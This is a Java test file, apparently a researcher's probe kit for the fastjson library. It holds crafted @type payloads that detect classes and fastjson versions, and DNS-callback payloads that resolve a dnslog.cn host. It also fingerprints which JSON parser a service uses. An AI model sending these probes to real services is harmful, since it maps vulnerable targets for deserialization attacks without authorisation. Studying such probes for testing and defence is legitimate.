package com.fastjsoncheck;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.google.gson.Gson;
import org.junit.Test;

/**
 * @author Whoopsunix
 */

public class FastjsonCheck {

    /**
     * 调用链探测
     */
    @Test
    public void classCheck() {
        // Character回显
        String Character = "{\n" +
                "  \"p\": {\n" +
                "    \"@type\": \"java.lang.Character\"{\n" +
                "  \"@type\": \"java.lang.Class\",\n" +
                "  \"val\": \"com.fastjsoncheck.User\"\n" +
                "}}";
//        fastjsonCheck(Character);

        String class1 = "{\n" +
                "  \"p\": {\n" +
                "    \"@type\": \"java.lang.Class\",\n" +
                "    \"val\": \"com.fastjsoncheck.User\"\n" +
                "  }\n" +
                "}";
//        fastjsonCheck(class1);

        String dns = "{\"@type\":\"java.net.Inet4Address\",\"val\":{\"@type\":\"java.lang.String\"{\"@type\":\"java.util.Locale\",\"val\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"java.lang.String\"\"@type\":\"java.util.Locale\",\"country\":\"dnslog\",\"language\":{\"@type\":\"java.lang.String\"{\"x\":{\"@type\":\"java.lang.Class\",\"val\":\"org.python.antlr.ParseException\"}}}}}";
        fastjsonCheck(dns);
    }


    /**
     * 版本探测
     */
    @Test
    public void versionCheck() {
        String exact = "{\"@type\": \"java.lang.AutoCloseable\"";
//        fastjsonCheck(exact);

        String dnslog = "144rvk.dnslog.cn";

        String p_47 = "[\n" +
                "  {\n" +
                "    \"@type\": \"java.lang.Class\",\n" +
                "    \"val\": \"java.io.ByteArrayOutputStream\"\n" +
                "  },\n" +
                "  {\n" +
                "    \"@type\": \"java.io.ByteArrayOutputStream\"\n" +
                "  },\n" +
                "  {\n" +
                "    \"@type\": \"java.net.InetSocketAddress\"\n" +
                "  {\n" +
                "    \"address\":,\n" +
                "    \"val\": \"" + dnslog + "\"\n" +
                "  }\n" +
                "}\n" +
                "]";
//        fastjsonCheck(p_47);

        String p_68 = "[\n" +
                "  {\n" +
                "    \"@type\": \"java.lang.AutoCloseable\",\n" +
                "    \"@type\": \"java.io.ByteArrayOutputStream\"\n" +
                "  },\n" +
                "  {\n" +
                "    \"@type\": \"java.io.ByteArrayOutputStream\"\n" +
                "  },\n" +
                "  {\n" +
                "    \"@type\": \"java.net.InetSocketAddress\"\n" +
                "  {\n" +
                "    \"address\":,\n" +
                "    \"val\": \"" + dnslog + "\"\n" +
                "  }\n" +
                "}\n" +
                "]";
        fastjsonCheck(p_68);

        String p_80 = "[\n" +
                "  {\n" +
                "    \"@type\": \"java.lang.Exception\",\n" +
                "    \"@type\": \"com.alibaba.fastjson.JSONException\",\n" +
                "    \"x\": {\n" +
                "      \"@type\": \"java.net.InetSocketAddress\"\n" +
                "  {\n" +
                "    \"address\":,\n" +
                "    \"val\": \"" + dnslog + "\"\n" +
                "  }\n" +
                "}\n" +
                "},\n" +
                "  {\n" +
                "    \"@type\": \"java.lang.Exception\",\n" +
                "    \"@type\": \"com.alibaba.fastjson.JSONException\",\n" +
                "    \"message\": {\n" +
                "      \"@type\": \"java.net.InetSocketAddress\"\n" +
                "  {\n" +
                "    \"address\":,\n" +
                "    \"val\": \"" + dnslog + "\"\n" +
                "  }\n" +
                "}\n" +
                "}\n" +
                "]\n";
//        fastjsonCheck(p_80);

    }


    /**
     * dnslog
     *
     * @throws Exception
     */
    @Test
    public void dnsLog() throws Exception {
        String fastjson1 = "{\"1\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"1.dnslog\"}}}";
        fastjsonCheck(fastjson1);
        String fastjson2 = "{\"2\":{{\"@type\":\"java.net.URL\",\"val\":\"http://2.dnslog\"}:\"x\"}}";
        fastjsonCheck(fastjson2);
        String fastjson3 = "{\"3\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\": \"java.net.URL\",\"val\":\"http://3.dnslog\"}}\"\"}}";
        fastjsonCheck(fastjson3);
        String fastjson4 = "{\"4\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"4.dnslog\"}}";
        fastjsonCheck(fastjson4);
        String fastjson5 = "{\"5\":{\"@type\":\"java.net.Inet6Address\",\"val\":\"5.dnslog\"}}";
        fastjsonCheck(fastjson5);
        String fastjson6 = "{\"6\":Set[{\"@type\":\"java.net.URL\",\"val\":\"http://6.dnslog\"}]}";
        fastjsonCheck(fastjson6);
        String fastjson7 = "{\"7\":{{\"@type\":\"java.net.URL\",\"val\":\"http://8.dnslog\"}:0}";
        fastjsonCheck(fastjson7);
    }


    /**
     * json框架区分
     *
     * @throws Exception
     */
    @Test
    public void jsonCheck() throws Exception {
        String json = "{\"username\":\"1234\",\"password\":123}";
        System.out.println("normal json");
        all(json);

        System.out.println("check jackson");
        String jackson1 = "{\"username\":\"1234\",\"password\":123,\"a\":1}";
        all(jackson1);
        String jackson2 = "{'username':'1234','password':'123'}";
        all(jackson2);
        String jackson3 = "{\"username\":\"1234\",\"password\":123}/**/";
        all(jackson3);
        String jackson4 = "{\"username\":\"1234\",\"password\":1.111111111111111111111111111111111,\"id\":1.1111111111111111111111111111111111111}";
        all(jackson4);

        System.out.println("check gson");
        String gson1 = "{\"username\":\"1234\",\"password\":1.111111111111111111111111111111111,\"id\":1}";
        all(gson1);
        String gson2 = "#\n{\"username\":\"1234\",\"password\":1,\"id\":1.1}";
        all(gson2);

        System.out.println("check org.json");
        String orgjson1 = "#\n{a:1}\n{\"username\":\"1234\",\"password\":1,\"id\":1.1}";
        all(orgjson1);
        String orgjson2 = "#\n{\"username\":\"\r\"}";
        all(orgjson2);

        System.out.println("check fastjson");
        String fastjson1 = "{\"@type\":\"whatever\"}";
        all(fastjson1);
    }

    public void all(String json) throws Exception {
        System.out.println(json);
//        String json = "{\"username\":\"1234\",\"password\":123}";
        System.out.println("[+] all check [+]");

        fastjsonCheck(json);
        jacksonCheck(json);
        gsonCheck(json);
        orgjsonCheck(json);

        System.out.println("\n\n");
    }


    public void fastjsonCheck(String json) {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        // fastjson
        try {
            System.out.println("[-] fastjson [-]");
            JSONObject jsonObject = JSON.parseObject(json);
            System.out.println("[-] fastjson print [-]");
            System.out.println(jsonObject.toString());
        } catch (Exception e) {
            System.out.println("[!] fastjson Exception print [!]");
            System.out.println(e);
        }
        System.out.println();
    }

    public void jacksonCheck(String json) {
        // jackson
        try {
            System.out.println("[-] jackson [-]");
            ObjectMapper objectMapper = new ObjectMapper();
//        objectMapper.enableDefaultTyping();
//        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL, JsonTypeInfo.As.PROPERTY);
            User user = objectMapper.readValue(json, User.class);
            System.out.println("[-] jackson print [-]");
            System.out.println(user);
        } catch (Exception e) {
            System.out.println("[!] jackson Exception print [!]");
            System.out.println(e.getMessage());
        }
        System.out.println();
    }

    public void gsonCheck(String json) {
        // gson
        try {
            System.out.println("[-] gson [-]");
            Gson gson = new Gson();
            User user = gson.fromJson(json, User.class);
            System.out.println("[-] gson print [-]");
            System.out.println(user);
        } catch (Exception e) {
            System.out.println("[!] gson Exception print [!]");
            System.out.println(e.getMessage());
        }
        System.out.println();
    }

    public void orgjsonCheck(String json) {
        // org.json
        try {
            System.out.println("[-] org.son [-]");
            org.json.JSONObject jsonObject1 = new org.json.JSONObject(json);
            System.out.println("[-] org.json print [-]");
            System.out.println(jsonObject1);
        } catch (Exception e) {
            System.out.println("[!] org.json Exception print [!]");
            System.out.println(e.getMessage());
        }
        System.out.println();
    }

    public void NewtonsoftCheck(String json) {
        // Newtonsoft.Json
        try {
            System.out.println("[-] Newtonsoft.Json [-]");
            org.json.JSONObject jsonObject1 = new org.json.JSONObject(json);
            System.out.println("[-] Newtonsoft.Json print [-]");
            System.out.println(jsonObject1);
        } catch (Exception e) {
            System.out.println("[!] Newtonsoft.Json Exception print [!]");
            System.out.println(e.getMessage());
        }
        System.out.println();
    }


}
